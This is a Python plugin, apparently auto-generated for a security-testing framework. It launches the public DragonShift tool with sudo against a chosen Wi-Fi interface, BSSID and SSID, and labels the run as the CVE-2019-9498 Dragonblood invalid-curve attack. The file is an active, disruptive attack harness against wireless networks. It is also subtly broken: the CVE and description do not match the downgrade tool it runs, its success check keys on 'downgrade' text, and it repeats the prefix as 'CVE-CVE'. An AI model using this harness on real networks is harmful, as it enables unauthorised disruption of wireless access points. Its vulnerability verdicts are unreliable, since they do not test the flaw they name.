#!/usr/bin/env python3
"""CVE-2019-9498 – Dragonblood WPA3/SAE: WPA3-SAE EAP-pwd invalid curve attack.

Public PoC source: https://github.com/jabbaw0nky/DragonShift
  dragonshift.py (CHAABT Moussa / Akerva, 2024)
  DragonShift v0.5 – WPA3-Transition Downgrade + SAE side-channel tool

Required tools: ip, iw, iwconfig, airodump-ng, airmon-ng, hostapd-mana
  (checked at startup by DragonShift)
"""
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 52,
    "cve": "CVE-2019-9498",
    "year": 2019,
    "domain": "wireless",
    "vendor_product": "hostapd / wpa_supplicant WPA3-SAE / EAP-pwd",
    "component": "SAE (Simultaneous Authentication of Equals) commit/confirm exchange",
    "type": "Side-channel / authentication bypass",
    "summary": "WPA3-SAE EAP-pwd invalid curve attack",
    "source_url": "https://github.com/jabbaw0nky/DragonShift",
    "requires_manual_review": True,
    "affected": [{"vendor": "Wi-Fi Alliance", "product": "WPA3-SAE",
                  "versions": [{"version": "pre-2019-04 patch", "status": "affected"}]}],
}

DRAGON_REPO   = Path(__file__).parent.parent.parent / "public_poc_sources/repos/jabbaw0nky__DragonShift"
DRAGON_SCRIPT = DRAGON_REPO / "dragonshift.py"

_REQUIRED_TOOLS = ["ip", "iw", "iwconfig", "airodump-ng", "airmon-ng", "hostapd-mana"]


def _run_poc(plugin):
    iface   = (plugin.params or {}).get("interface", "wlan0")
    target  = (plugin.params or {}).get("target_bssid", "")
    ssid    = (plugin.params or {}).get("ssid", "")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    missing = [t for t in _REQUIRED_TOOLS if not shutil.which(t)]
    evidence = {
        "cve": "CVE-2019-9498",
        "dragonshift_script": str(DRAGON_SCRIPT),
        "script_present": DRAGON_SCRIPT.exists(),
        "missing_tools": missing,
        "attack_surface": "EAP-pwd commit frame with point not on curve accepted → side channel",
    }

    if allow_disruptive and DRAGON_SCRIPT.exists() and not missing and iface:
        cmd = ["sudo", "python3", str(DRAGON_SCRIPT), "-i", iface]
        if target: cmd += ["-b", target]
        if ssid:   cmd += ["-e", ssid]
        evidence["command"] = " ".join(cmd)
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            evidence["rc"]     = proc.returncode
            evidence["stdout"] = proc.stdout[:800]
            evidence["stderr"] = proc.stderr[:400]
            evidence["vulnerable"] = ("downgrade" in proc.stdout.lower() or
                                       "success" in proc.stdout.lower())
        except subprocess.TimeoutExpired:
            evidence["detail"] = "Test timed out after 120s."
        except Exception as exc:
            evidence["detail"] = str(exc)
    else:
        if missing:
            evidence["detail"] = f"Missing tools: {missing}"
        else:
            evidence["detail"] = (
                "Provide interface=, ssid=, allow_disruptive=true."
            )

    return {
        "vulnerable": evidence.get("vulnerable"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "jabbaw0nky/DragonShift / dragonshift.py (CVE-CVE-2019-9498)",
    }


class Poc84Cve20199498DragonbloodSaeAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-WIRELESS-084"
    meta_poc_name   = "CVE-2019-9498 Dragonblood WPA3-SAE WPA3-SAE EAP-pwd invalid curve attack"
    meta_cve_id     = "CVE-2019-9498"
    meta_severity   = "High"
    meta_protocol   = "wifi"
    meta_target_os  = ["linux", "embedded"]
    meta_required_params = ["interface"]
    meta_optional_params = ["ssid", "target_bssid", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/jabbaw0nky/DragonShift"
    meta_attack_surface = "EAP-pwd commit frame with point not on curve accepted → side channel"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return bool((self.params or {}).get("interface"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
